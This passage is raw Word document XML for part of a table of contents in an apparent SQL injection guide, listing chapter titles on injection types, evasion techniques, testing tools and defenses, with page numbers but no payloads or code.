                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408614 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>40</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="158DFB40" w14:textId="23C1FDB8" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408615" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>What is SQL Injection?</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408615 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>40</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="02EC72D6" w14:textId="06B4DABA" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408616" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Types of SQL Injection</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408616 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>40</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="43FE3224" w14:textId="6CA65981" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408617" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Core Exploitation Techniques</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408617 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>41</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="09D663FA" w14:textId="45F41469" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408618"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_Toc208408618 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>41</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="00C63096" w14:textId="3E7F05B1" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408619" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Obfuscation &amp; Evasion Tricks</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408619 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>41</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4E4297E6" w14:textId="655C549E" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408620" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Real-World SQLi Examples</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408620 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6BCA2F3D" w14:textId="5150F907" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408621"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_Toc208408621 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="468336EA" w14:textId="66167762" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408622" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Times New Roman" w:hAnsi="Calibri"/>
                <w:noProof/>
              </w:rPr>
              <w:t>8. Tools for Testing</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408622 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="32DE7D4F" w14:textId="161A595D" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408623" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1. Union-based SQL Injection</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408623 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1C7A126C" w14:textId="214626E1" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408624" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2. Error-based SQL Injection</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408624 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="12218118" w14:textId="25D2C3AD" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408625" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3. Boolean-based Blind SQL Injection</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408625 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2A62309D" w14:textId="00C03562" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408626" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>4. Time-based Blind SQL Injection</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408626 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>43</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="13EFC809" w14:textId="0F09F612" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408627" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>5. Out-of-Band SQL Injection (OAST)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408627 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>43</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="70D9C24E" w14:textId="6BD7E385" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408628" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>6. Second-Order SQL Injection</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408628 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>43</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6D001DA6" w14:textId="437288DC" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408629" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>7. Stacked Queries</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408629 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>43</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="387E5820" w14:textId="42CAE3C8" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408630" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>8. Advanced Evasion &amp; Bypass Techniques</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408630 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>43</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="62078FFA" w14:textId="6A0E5DB7" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408631" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Quick Attack → Defense Mapping</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
